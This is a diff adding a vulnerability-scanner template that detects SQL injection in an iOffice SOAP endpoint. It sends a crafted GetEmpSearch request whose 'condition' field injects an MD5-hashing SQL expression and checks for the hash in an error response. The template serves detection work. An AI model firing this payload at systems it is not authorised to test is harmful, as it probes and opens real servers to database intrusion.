@@ -1,0 +1,33 @@
+id: ioffice-sql-injection
+info:
+  name: iOffice SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL Injection vulnerability in the iOffice endpoint using SOAP request with MD5 hash matching.
+variables:
+  random: "{{rand_int(1000000000, 9000000000)}}"
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+              <condition>1=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{random}}')),3,32)</condition>
+            </GetEmpSearch>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "{{md5(random)}}"
+        part: body
